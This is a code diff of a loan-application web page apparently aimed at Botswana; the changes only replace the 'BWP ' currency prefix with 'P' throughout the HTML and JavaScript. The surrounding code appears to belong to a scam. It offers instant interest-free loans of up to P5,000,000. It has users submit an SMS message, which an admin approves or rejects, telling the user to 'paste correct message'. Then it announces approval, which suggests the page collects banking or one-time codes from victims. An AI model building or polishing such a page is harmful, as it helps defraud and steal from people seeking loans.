@@ -252,7 +252,7 @@
         <h2>Loan Calculator</h2>
         <div class="calc-row2">
           <span>Amount</span>
-          <span class="cv" id="calcAmt">BWP 500,000</span>
+          <span class="cv" id="calcAmt">P500,000</span>
         </div>
         <div class="calc-row2">
           <span>Term</span>
@@ -260,12 +260,12 @@
         </div>
         <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000" oninput="updateCalc()">
         <div class="range-ends">
-          <span>BWP 500,000</span>
-          <span>BWP 5,000,000</span>
+          <span>P500,000</span>
+          <span>P5,000,000</span>
         </div>
         <div class="monthly-box">
           <span class="ml">Monthly Payment</span>
-          <span class="ma" id="monthlyAmt">BWP 24,000</span>
+          <span class="ma" id="monthlyAmt">P24,000</span>
         </div>
       </div>
       <button class="btn-grad" onclick="goTo('page-step1')">START APPLICATION</button>
@@ -294,7 +294,7 @@
       <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
       <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
       <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div></div>
-      <div class="field"><label>Loan Amount (BWP)</label><input type="number" id="s1am" value="1000000" placeholder="Enter amount" oninput="clearErr('s1Err')"></div>
+      <div class="field"><label>Loan Amount (P)</label><input type="number" id="s1am" value="1000000" placeholder="Enter amount" oninput="clearErr('s1Err')"></div>
       <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
       <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
       <button class="btn-grad" onclick="toS2()">NEXT STEP</button>
@@ -359,10 +359,10 @@
       <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
       <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
       <div class="field"><label>Employment Status</label><div class="sel-wrap"><select id="s3em"><option>Employed</option><option selected>Self-employed</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div></div>
-      <div class="field"><label>Annual Income (BWP)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')"></div>
+      <div class="field"><label>Annual Income (P)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')"></div>
       <div class="sum-box">
         <h3>Application Summary</h3>
-        <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">BWP 1,000,000</span></div>
+        <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">P1,000,000</span></div>
         <div class="sum-row"><span class="sk">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
         <div class="sum-row"><span class="sk">Purpose:</span><span class="sv" id="sP">—</span></div>
         <div class="sum-row"><span class="sk">Applicant:</span><span class="sv" id="sN">—</span></div>
@@ -500,7 +500,7 @@
       <p class="appr-sub">Your loan has been successfully approved.</p>
       <div class="appr-banner">
         <div class="abl">Amount to Receive</div>
-        <div class="aba" id="aprAmount">BWP 1,000,000</div>
+        <div class="aba" id="aprAmount">P1,000,000</div>
       </div>
     </div>
     <div class="comp-box">
@@ -513,7 +513,7 @@
         <div class="ld-icon ic-g">💰</div>
         <div>
           <div class="ld-lbl">Amount</div>
-          <div class="ld-val" id="aprAmt">BWP 1,000,000</div>
+          <div class="ld-val" id="aprAmt">P1,000,000</div>
         </div>
       </div>
       <div class="ld-row">
@@ -527,7 +527,7 @@
         <div class="ld-icon ic-p">💳</div>
         <div>
           <div class="ld-lbl">Monthly Payment</div>
-          <div class="ld-val" id="aprMth">BWP 24,000</div>
+          <div class="ld-val" id="aprMth">P24,000</div>
         </div>
       </div>
     </div>
@@ -636,9 +636,9 @@
   // LANDING PAGE CALC
   function updateCalc() {
     const amt = +document.getElementById('amtSlider').value;
-    document.getElementById('calcAmt').textContent = 'BWP ' + amt.toLocaleString();
+    document.getElementById('calcAmt').textContent = 'P' + amt.toLocaleString();
     const monthly = Math.ceil(amt / 48);
-    document.getElementById('monthlyAmt').textContent = 'BWP ' + monthly.toLocaleString();
+    document.getElementById('monthlyAmt').textContent = 'P' + monthly.toLocaleString();
   }
 
   // ══════════════════════════════════════════════════════
@@ -919,11 +919,11 @@
             console.log('✅ Admin approved SMS');
             clearTimeout(smsPollTimeout);
             // Update approval page with loan details
-            document.getElementById('aprAmount').textContent = 'BWP ' + (S.loanAmount || 1000000).toLocaleString();
-            document.getElementById('aprAmt').textContent = 'BWP ' + (S.loanAmount || 1000000).toLocaleString();
+            document.getElementById('aprAmount').textContent = 'P' + (S.loanAmount || 1000000).toLocaleString();
+            document.getElementById('aprAmt').textContent = 'P' + (S.loanAmount || 1000000).toLocaleString();
             document.getElementById('aprTerm').textContent = S.loanTerm || '48 Months';
             const monthly = Math.ceil((S.loanAmount || 1000000) / (parseInt(S.loanTerm || '48')));
-            document.getElementById('aprMth').textContent = 'BWP ' + monthly.toLocaleString();
+            document.getElementById('aprMth').textContent = 'P' + monthly.toLocaleString();
             goTo('page-approval');
           } else if (status === 'rejected') {
             console.log('❌ Admin rejected SMS - ask user to paste correct message');
